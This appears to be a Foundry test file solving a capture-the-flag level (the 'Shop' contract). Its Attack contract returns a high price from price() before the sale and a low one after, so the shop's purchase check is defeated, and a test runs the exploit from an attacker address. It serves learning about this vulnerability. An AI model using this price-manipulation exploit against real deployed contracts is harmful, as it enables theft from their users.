// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "@forge-std/Test.sol";

contract Attack is Buyer {
    Shop public shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1: 1000;
    }

    function pwn() public {
        shop.buy();
    }
}

contract ShopTest is Test {

    Shop public shopContract;
    address public attacker;
    function setUp() public {
        shopContract = new Shop();
        attacker = vm.addr(1);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Attack attack = new Attack(address(shopContract));
        attack.pwn();
        vm.stopPrank();
    }
}